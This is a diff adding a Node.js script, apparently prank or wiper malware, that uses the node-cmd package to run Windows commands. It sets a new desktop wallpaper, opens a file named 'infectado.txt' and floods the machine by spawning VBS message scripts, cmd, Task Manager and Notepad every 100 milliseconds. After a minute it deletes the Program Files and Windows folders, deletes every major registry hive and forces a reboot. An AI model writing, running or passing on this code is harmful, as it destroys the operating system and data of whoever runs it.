@@ -1,0 +1,32 @@
+const cmd = require("node-cmd")
+
+cmd.run("@echo off")
+cmd.run("start ./infectado.txt")
+cmd.run('reg add "HKCU\Control Panel\Desktop" /v wallpaper /t REG_SZ /d "" /f')
+cmd.run(`reg add "HKCU\Control Panel\Desktop" /v wallpaper /t REG_SZ /d "${__dirname}\img.jpg" /f`)
+cmd.run('reg delete "HKCU\Software\Microsoft\Internet Explorer\Desktop\General" /v WallpaperStyle /f')
+cmd.run('reg add "HKCU\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f')
+cmd.run('RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters')
+setInterval(() => {
+cmd.run("start ./msgs.vbs")
+cmd.run("start ./msgs2.vbs")
+cmd.run("start ./msg3.vbs")
+cmd.run("start cmd")
+cmd.run("start taskmgr")
+cmd.run("start notepad")
+}, 100)
+	setTimeout(() => {
+	cmd.run("del C:\Program Files /q /f /s")
+	cmd.run("del C:\Program Files (x86) /q /f /s")
+	cmd.run("del C:\Windows /q /f /s")
+	cmd.run("reg delete HKLM /f")
+	cmd.run("reg delete HKCU /f")
+	cmd.run("reg delete HKCR /f")
+	cmd.run("reg delete HKU /f")
+	cmd.run("reg delete HKCC /f")
+	setTimeout(() => {
+		cmd.run("shutdown /r /f")
+		cmd.run("exit")
+	}, 5000)
+}, 60000)
+
